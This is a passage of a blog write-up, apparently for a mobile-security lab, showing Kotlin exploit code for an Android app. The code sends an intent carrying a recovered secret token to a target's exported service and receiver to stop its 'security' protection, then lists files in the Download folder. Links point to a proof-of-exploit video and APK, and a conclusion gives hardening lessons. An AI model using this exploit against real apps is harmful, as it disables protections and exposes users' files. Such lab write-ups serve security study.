+</span></span><span class="line"><span class="cl">        <span class="n">putExtra</span><span class="p">(</span><span class="n">EXTRA_TOKEN</span><span class="p">,</span> <span class="n">SECRET_TOKEN</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">fun</span> <span class="nf">sendStopSecurityBroadcast</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sendBroadcast</span><span class="p">(</span><span class="n">createSecurityIntent</span><span class="p">(</span><span class="n">RECEIVER_CLASS</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">override</span> <span class="k">fun</span> <span class="nf">onCreate</span><span class="p">(</span><span class="n">savedInstanceState</span><span class="p">:</span> <span class="n">Bundle</span><span class="p">?)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">super</span><span class="p">.</span><span class="n">onCreate</span><span class="p">(</span><span class="n">savedInstanceState</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">enableEdgeToEdge</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setContent</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">MyApplicationTheme</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Scaffold</span><span class="p">(</span><span class="n">modifier</span> <span class="p">=</span> <span class="nc">Modifier</span><span class="p">.</span><span class="n">fillMaxSize</span><span class="p">())</span> <span class="p">{</span> <span class="n">innerPadding</span> <span class="o">-&gt;</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">Greeting</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">name</span> <span class="p">=</span> <span class="s2">&#34;Android&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">files</span> <span class="p">=</span> <span class="n">fileList</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">modifier</span> <span class="p">=</span> <span class="nc">Modifier</span><span class="p">.</span><span class="n">padding</span><span class="p">(</span><span class="n">innerPadding</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">onStopSecurityClick</span> <span class="p">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">stopSecurity</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">onReadFilesClick</span> <span class="p">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">readDownloadDirectory</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">fun</span> <span class="nf">readDownloadDirectory</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fileList</span><span class="p">.</span><span class="n">clear</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">val</span> <span class="py">downloadFolder</span> <span class="p">=</span> <span class="nc">Environment</span><span class="p">.</span><span class="n">getExternalStoragePublicDirectory</span><span class="p">(</span><span class="nc">Environment</span><span class="p">.</span><span class="n">DIRECTORY_DOWNLOADS</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">val</span> <span class="py">files</span> <span class="p">=</span> <span class="n">downloadFolder</span><span class="p">.</span><span class="n">listFiles</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">files</span> <span class="o">!=</span> <span class="k">null</span> <span class="o">&amp;&amp;</span> <span class="n">files</span><span class="p">.</span><span class="n">isNotEmpty</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">files</span><span class="p">.</span><span class="n">forEach</span> <span class="p">{</span> <span class="k">file</span> <span class="o">-&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fileList</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="k">file</span><span class="p">.</span><span class="n">absolutePath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nc">Toast</span><span class="p">.</span><span class="n">makeText</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="s2">&#34;Download folder is empty or inaccessible&#34;</span><span class="p">,</span> <span class="nc">Toast</span><span class="p">.</span><span class="n">LENGTH_SHORT</span><span class="p">).</span><span class="n">show</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">fun</span> <span class="nf">stopSecurity</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">startService</span><span class="p">(</span><span class="n">createSecurityIntent</span><span class="p">(</span><span class="n">SERVICE_CLASS</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sendStopSecurityBroadcast</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="nc">Toast</span><span class="p">.</span><span class="n">makeText</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="s2">&#34;Stopping Security Service&#34;</span><span class="p">,</span> <span class="nc">Toast</span><span class="p">.</span><span class="n">LENGTH_SHORT</span><span class="p">).</span><span class="n">show</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">e</span><span class="p">:</span> <span class="n">Exception</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nc">Toast</span><span class="p">.</span><span class="n">makeText</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="s2">&#34;Error: </span><span class="si">${e.message}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nc">Toast</span><span class="p">.</span><span class="n">LENGTH_LONG</span><span class="p">).</span><span class="n">show</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">override</span> <span class="k">fun</span> <span class="nf">onDestroy</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">super</span><span class="p">.</span><span class="n">onDestroy</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">unregisterReceiver</span><span class="p">(</span><span class="n">securityStartedReceiver</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">e</span><span class="p">:</span> <span class="n">Exception</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nc">Log</span><span class="p">.</span><span class="n">i</span><span class="p">(</span><span class="s2">&#34;missing_register&#34;</span><span class="p">,</span> <span class="s2">&#34;Receiver not registered&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@Composable</span>
+</span></span><span class="line"><span class="cl"><span class="k">fun</span> <span class="nf">Greeting</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span><span class="p">:</span> <span class="n">String</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">files</span><span class="p">:</span> <span class="n">List</span><span class="p">&lt;</span><span class="n">String</span><span class="p">&gt;,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">modifier</span><span class="p">:</span> <span class="n">Modifier</span> <span class="p">=</span> <span class="n">Modifier</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">onStopSecurityClick</span><span class="p">:</span> <span class="p">()</span> <span class="o">-&gt;</span> <span class="n">Unit</span> <span class="p">=</span> <span class="p">{},</span>
+</span></span><span class="line"><span class="cl">    <span class="n">onReadFilesClick</span><span class="p">:</span> <span class="p">()</span> <span class="o">-&gt;</span> <span class="n">Unit</span> <span class="p">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Column</span><span class="p">(</span><span class="n">modifier</span> <span class="p">=</span> <span class="n">modifier</span><span class="p">.</span><span class="n">padding</span><span class="p">(</span><span class="mi">16</span><span class="p">.</span><span class="n">dp</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Text</span><span class="p">(</span><span class="n">text</span> <span class="p">=</span> <span class="s2">&#34;Hello </span><span class="si">$name</span><span class="s2">!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Button</span><span class="p">(</span><span class="n">onClick</span> <span class="p">=</span> <span class="n">onStopSecurityClick</span><span class="p">,</span> <span class="n">modifier</span> <span class="p">=</span> <span class="nc">Modifier</span><span class="p">.</span><span class="n">padding</span><span class="p">(</span><span class="n">top</span> <span class="p">=</span> <span class="mi">8</span><span class="p">.</span><span class="n">dp</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Text</span><span class="p">(</span><span class="s2">&#34;Stop Security&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Button</span><span class="p">(</span><span class="n">onClick</span> <span class="p">=</span> <span class="n">onReadFilesClick</span><span class="p">,</span> <span class="n">modifier</span> <span class="p">=</span> <span class="nc">Modifier</span><span class="p">.</span><span class="n">padding</span><span class="p">(</span><span class="n">top</span> <span class="p">=</span> <span class="mi">8</span><span class="p">.</span><span class="n">dp</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Text</span><span class="p">(</span><span class="s2">&#34;Read Files&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Text</span><span class="p">(</span><span class="n">text</span> <span class="p">=</span> <span class="s2">&#34;Files in /Download:&#34;</span><span class="p">,</span> <span class="n">modifier</span> <span class="p">=</span> <span class="nc">Modifier</span><span class="p">.</span><span class="n">padding</span><span class="p">(</span><span class="n">top</span> <span class="p">=</span> <span class="mi">16</span><span class="p">.</span><span class="n">dp</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">LazyColumn</span><span class="p">(</span><span class="n">modifier</span> <span class="p">=</span> <span class="nc">Modifier</span><span class="p">.</span><span class="n">fillMaxSize</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">items</span><span class="p">(</span><span class="n">files</span><span class="p">)</span> <span class="p">{</span> <span class="n">filePath</span> <span class="o">-&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Column</span><span class="p">(</span><span class="n">modifier</span> <span class="p">=</span> <span class="nc">Modifier</span><span class="p">.</span><span class="n">padding</span><span class="p">(</span><span class="n">vertical</span> <span class="p">=</span> <span class="mi">8</span><span class="p">.</span><span class="n">dp</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="n">filePath</span><span class="p">.</span><span class="n">lowercase</span><span class="p">().</span><span class="n">endsWith</span><span class="p">(</span><span class="s2">&#34;.jpg&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="n">filePath</span><span class="p">.</span><span class="n">lowercase</span><span class="p">().</span><span class="n">endsWith</span><span class="p">(</span><span class="s2">&#34;.png&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">AsyncImage</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">model</span> <span class="p">=</span> <span class="n">filePath</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">contentDescription</span> <span class="p">=</span> <span class="s2">&#34;Image&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">modifier</span> <span class="p">=</span> <span class="nc">Modifier</span><span class="p">.</span><span class="n">fillMaxWidth</span><span class="p">().</span><span class="n">height</span><span class="p">(</span><span class="mi">200</span><span class="p">.</span><span class="n">dp</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">contentScale</span> <span class="p">=</span> <span class="nc">ContentScale</span><span class="p">.</span><span class="n">Crop</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">Text</span><span class="p">(</span><span class="n">text</span> <span class="p">=</span> <span class="n">filePath</span><span class="p">.</span><span class="n">substringAfterLast</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">),</span> <span class="n">modifier</span> <span class="p">=</span> <span class="nc">Modifier</span><span class="p">.</span><span class="n">padding</span><span class="p">(</span><span class="n">top</span> <span class="p">=</span> <span class="mi">4</span><span class="p">.</span><span class="n">dp</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@Preview</span><span class="p">(</span><span class="n">showBackground</span> <span class="p">=</span> <span class="k">true</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@Composable</span>
+</span></span><span class="line"><span class="cl"><span class="k">fun</span> <span class="nf">GreetingPreview</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MyApplicationTheme</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Greeting</span><span class="p">(</span><span class="s2">&#34;Android&#34;</span><span class="p">,</span> <span class="n">emptyList</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="resources" class="relative group">Resources <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#resources" aria-label="Anchor">#</a></span></h2>
+<p>Here is the proof of exploit video: <a
+  href="https://youtu.be/0gmX6fSeqak"
+  
+  target="_blank" rel="noreferrer noopener"
+>https://youtu.be/0gmX6fSeqak</a></p>
+<p>And here is the link to the <a
+  href="https://github.com/Florence-Njeri/MobileSecurityExploitz/blob/master/AndroPsuedoProtect/exploit.apk"
+  
+  target="_blank" rel="noreferrer noopener"
+>exploit apk</a></p>
+<hr>
+<h3 id="conclusion" class="relative group">Conclusion <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a></span></h3>
+<p>This exercise highlights several important mobile security principles:</p>
+<ul>
+<li>**We should not set sensitive components of our application to <code>exported=true**</code>: Any exported component expands your attack surface. If a component does not need to be accessed externally, it should not be exported. If it must be exported, it should be protected with strong custom permissions.</li>
+<li><strong>Security by Obscurity doesn&rsquo;t make your app secure</strong>: Moving sensitive values to a native library <code>.so</code> file does not prevent reverse engineering. Attackers can decompile, disassemble, and analyze native libraries to obtain the hidden app secrets easily using tools like Ghidra.</li>
+</ul>
+<hr>
+
+      </div>
+    </section>
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/posts/factsdroid/">
+              <span
+                class="mr-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-2 text-neutral-700 transition-transform group-hover:translate-x-[2px] group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >8kSec - Factsdroid WriteUp</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2026-02-04 09:00:00 &#43;0000 UTC">February 4, 2026</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/posts/android_storage/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Insecure Storage in Android</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2026-04-15 09:00:00 &#43;0000 UTC">April 15, 2026</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-2 text-neutral-700 transition-transform group-hover:translate-x-[2px] group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+          <div
+            class="pointer-events-none absolute top-[100vh] bottom-0 w-12 ltr:right-0 rtl:left-0"
+          >
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+    <nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex flex-col list-none sm:flex-row">
+        
+          <li
+            class="mb-1 group ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+          >
+            
+              <a
+                href="https://github.com/Florence-Njeri"
+                title=""
+                target="_blank"
+                >
+                  <span
+                    class="transition-colors group-dark:hover:text-primary-400 group-hover:text-primary-600"
+                  >
+                    
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+                  </span>
+                </a
+              >
+            
+          </li>
+        
+          <li
+            class="mb-1 group ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+          >
+            
+              <a
+                href="https://www.linkedin.com/in/florencenjeri/"
+                title=""
+                target="_blank"
+                >
+                  <span
+                    class="transition-colors group-dark:hover:text-primary-400 group-hover:text-primary-600"
+                  >
+                    
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+
+                  </span>
+                </a
+              >
+            
+          </li>
+        
+      </ul>
+    </nav>
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+        
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2026
+            Florence Njeri
+        </p>
+      
+      
+    </div>
+    
+  </div>
+  
+</footer>
+    </div>
+  </body>
+</html>
